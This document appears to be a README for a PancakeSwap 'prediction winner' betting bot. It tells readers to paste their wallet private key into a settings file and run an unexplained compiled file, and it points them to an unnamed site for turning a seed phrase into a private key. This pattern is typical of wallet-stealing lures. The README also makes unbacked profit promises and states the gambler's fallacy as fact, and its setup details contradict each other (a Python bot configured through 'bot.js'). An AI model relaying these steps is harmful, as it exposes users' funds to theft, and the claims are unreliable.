# pancakeswap-prediction-winner-bot with Python
PancakeSwap Prediction Bot [Fullversion]. Free for change your life !

![18](https://user-images.githubusercontent.com/123884886/215973126-84ac0fff-6185-48d9-8906-15a8d9c9ec11.png)

The bot that uses signals from TradingView to predict the price of BNB for Up or Down in PancakeSwap.

⭐Please consider giving a star.
🐰⚡ Installation
1. Download python3.12 for your PC from python org, extract the ABI and themes zip into the folder with the bot
Link for download python: https://www.python.org/downloads/release/python-3120a1/

2. Open "setting.txt" (with notepad for instance) and add your ethereum/bsc address and private key, contract address for snipping & config your bot.
3. Open the bot.js file and setup the following variables:
BET_AMOUNT: 5, // Amount of each bet (In USD)
DAILY_GOAL: 20, // Total profit you are aiming to earn (In USD)

4. Run "launchbot.bat" OR type "py prediction.pyc"

🔮 Enjoy!
🔓 How to convert seed phrase to Private Key
A lot of wallets don't provide you the private key, but just the seed phrase ( 12 words ). So here you will learn how to convert that to a private key:

Enter Here and follow the instructions. Website used is this one.
Winning rate

🤖📈 Strategy
The bot take a series of recomendations given by Trading View and proccess them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet 🟢UP or 🔴DOWN.
After all my testings in aprox 300 rounds I was able to achieve a ~70% Win rate. Of course it depends of a lot of variables, so I can't ensure that you will reproduce the same behavior. But I can tell that I make $20 - $70 daily with $3 Bets.
Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
Also it will save the daily history in the /history directory.
Be aware that after consecutive losses, statistically you have more chances to win in the next one.
Inside bot.js in the THRESHOLD property of GLOBAL_CONFIG variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.
💰You can check the history of rounds and claim rewards here: https://pancakeswap.finance/prediction

✔️ To Do
 USD Based bet
 Show real time profit
 Show real time win rate
 Daily goal profit
 Improved algorithm v1.1 🔥
 AI Driven bot 🔥
 Stop Loss
 Simplify settings
 Auto collect winnings
👁️ Disclaimers
Please be aware of clones

👷Use it at your own risk. If you are going to bet, please do it with money that you are willing to lose. And please try to bet with a low amount to gradually generate profit.

Author

If you have any questions you can contact me via telegram: https://t.me/trading_supporters
